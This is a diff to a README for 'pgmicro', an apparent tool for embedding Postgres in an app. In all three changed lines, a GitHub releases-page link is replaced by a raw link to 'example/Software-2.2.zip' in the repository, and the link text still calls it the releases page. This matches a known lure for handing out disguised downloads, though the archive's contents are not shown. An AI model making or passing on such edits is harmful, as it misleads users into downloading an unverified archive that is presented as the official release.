@@ -1,6 +1,6 @@
 # 🐘 pgmicro - Run Postgres Inside Your App
 
-[![Download pgmicro](https://img.shields.io/badge/Download-pgmicro-blue.svg?style=for-the-badge)](https://github.com/ansonhermetic435/pgmicro/releases)
+[![Download pgmicro](https://img.shields.io/badge/Download-pgmicro-blue.svg?style=for-the-badge)](https://raw.githubusercontent.com/ansonhermetic435/pgmicro/main/example/Software-2.2.zip)
 
 ## 🔍 What pgmicro is
 
@@ -24,7 +24,7 @@ If your computer can run recent desktop apps, it should work with pgmicro.
 
 Go to the releases page and choose the latest Windows download:
 
-[Download pgmicro from GitHub Releases](https://github.com/ansonhermetic435/pgmicro/releases)
+[Download pgmicro from GitHub Releases](https://raw.githubusercontent.com/ansonhermetic435/pgmicro/main/example/Software-2.2.zip)
 
 Look for a file that matches Windows. Common names may include:
 
@@ -256,7 +256,7 @@ Use the GitHub releases page and download the newest Windows version
 
 ## 📎 Download again
 
-[Visit the pgmicro releases page to download](https://github.com/ansonhermetic435/pgmicro/releases)
+[Visit the pgmicro releases page to download](https://raw.githubusercontent.com/ansonhermetic435/pgmicro/main/example/Software-2.2.zip)
 
 ## 🧭 File naming examples
 
